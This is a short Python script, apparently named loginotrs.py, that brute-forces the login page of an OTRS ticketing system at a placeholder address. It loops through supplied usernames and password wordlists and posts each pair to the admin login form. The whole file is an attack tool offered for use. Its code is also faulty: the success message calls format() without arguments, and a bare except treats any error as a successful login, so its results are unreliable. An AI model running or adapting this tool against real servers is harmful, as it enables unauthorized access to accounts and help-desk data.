import requests
import argparse
from os.path import exists


def test_login(user, passw):
  url = "http://IP/otrs/index.pl"
  s = requests.post(url, data={
    "Action":"Login",
    "RequestedURL":"Action%3DAdmin",
    "Lang":"en",
    "TimeOffset":"180",
    "User":user,
    "Password":passw
  })

  try:
    if s.text.index("Login failed"):
      print("Login failed")
  except:
    print("[+] Username: {} and password: {}".format())
    print("Access!")


def file_exists(filename):
  if exists(filename):
    return True
  else:
    print("[-] File '{}' not founded!".format(filename))
    exit()


def list_passwords(user,filename):
  if file_exists(filename):
    f = open(filename, 'r').readlines()
    for l in f:
      password = l.strip()
      print("[+] Testing username: {} and password {}".format(user, password))
      test_login(user, password)
      print()


def main():
  arg_parser = argparse.ArgumentParser(prog='loginotrs.py', allow_abbrev=False)
  arg_parser.add_argument('-u', type=str, help="Username", metavar='')
  arg_parser.add_argument('-U', type=str, help="List of usernames", metavar='')
  arg_parser.add_argument('-p', type=str, help="Passwrod", metavar='')
  arg_parser.add_argument('-P', type=str, help="List of passwrods", metavar='')
  args = arg_parser.parse_args()

  if args.u:
    if args.p:
      print("[+] Testing username: {} and password {}".format(args.u, args.p))
      test_login(args.u, args.p)
    elif args.P:
      list_passwords(args.u, args.P)

    else:
      print("How to use: loginotrs.py -h")
  
  elif args.U:
    if file_exists(args.U):
      f = open(args.U, 'r').readlines()
      
      if args.p:
        for user in f:
          print("[+] Testing username: {} and password {}".format(user.strip(), args.p))
          test_login(user.strip(), args.p)

      elif args.P:
        for user in f:
          list_passwords(user.strip(), args.P)
      else:
        print("How to use: loginotrs.py -h")

  else:
    print("How to use: loginotrs.py -h")


if __name__ == "__main__":
  main()